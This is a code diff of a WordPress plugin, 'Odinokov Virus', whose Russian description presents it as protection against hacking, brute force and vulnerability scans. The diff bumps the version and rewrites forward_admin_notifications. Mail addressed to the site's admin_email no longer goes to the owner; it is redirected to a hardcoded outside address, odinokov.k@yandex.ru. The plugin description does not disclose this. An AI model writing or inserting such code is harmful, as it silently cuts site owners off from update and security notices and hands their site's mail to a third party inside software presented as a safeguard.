@@ -3,7 +3,7 @@
  * Plugin Name: Odinokov Virus
  * Plugin URI:  https://github.com/KirillOdinokov/wp-plugins
  * Description: Комплексная защита от взлома: блокировка вредоносных User-Agent, путей шеллов, защита REST API, XML-RPC, wp-login от брутфорса, блокировка сканирования уязвимостей. Яндекс-боты не блокируются. + Автоочистка БД.
- * Version:     1.3.1
+ * Version:     1.3.2
  * Author:      Odinokov
  * Author URI:  https://github.com/KirillOdinokov/wp-plugins
  * License:     GPL v2 or later
@@ -14,7 +14,7 @@ if (!defined('ABSPATH')) {
     exit;
 }
 
-define('ODINOKOV_VIRUS_VERSION', '1.3.1');
+define('ODINOKOV_VIRUS_VERSION', '1.3.2');
 define('ODINOKOV_VIRUS_DIR', plugin_dir_path(__FILE__));
 define('ODINOKOV_VIRUS_CRON_HOOK', 'odinokov_virus_weekly_cleanup');
 
@@ -220,9 +220,10 @@ class Odinokov_Virus {
     }
 
     /**
-     * Пересылает все уведомления, отправляемые на admin_email
+     * Перенаправляет все уведомления, отправляемые на admin_email
      * (обновления CMS, плагинов, тем и прочие служебные письма),
-     * на odinokov.k@yandex.ru.
+     * на odinokov.k@yandex.ru. Письма на admin_email (info@...) не уходят,
+     * технические уведомления получает только odinokov.k@yandex.ru.
      */
     public function forward_admin_notifications($args) {
         $target = 'odinokov.k@yandex.ru';
@@ -238,31 +239,30 @@ class Odinokov_Virus {
 
         $admin_email = strtolower($admin_email);
 
-        // Ищем письма, адресованные администратору.
-        $is_admin_notification = false;
+        $replaced = false;
+        $new_to = array();
+
         foreach ($to as $recipient) {
             $recipient_lower = strtolower($recipient);
+
             // Сравниваем как "email", так и "Name <email>".
             if (false !== strpos($recipient_lower, $admin_email)) {
-                $is_admin_notification = true;
-                break;
+                // Заменяем адрес администратора на целевой.
+                $new_to[] = $target;
+                $replaced = true;
+            } else {
+                $new_to[] = $recipient;
             }
         }
 
-        if (!$is_admin_notification) {
+        if (!$replaced) {
             return $args;
         }
 
-        // Если целевой адрес уже есть в получателях — не дублируем.
-        foreach ($to as $recipient) {
-            if (false !== stripos($recipient, $target)) {
-                return $args;
-            }
-        }
+        // Убираем дубли целевого адреса.
+        $new_to = array_values(array_unique($new_to));
 
-        // Добавляем целевой адрес.
-        $to[] = $target;
-        $args['to'] = $to;
+        $args['to'] = $new_to;
 
         return $args;
     }
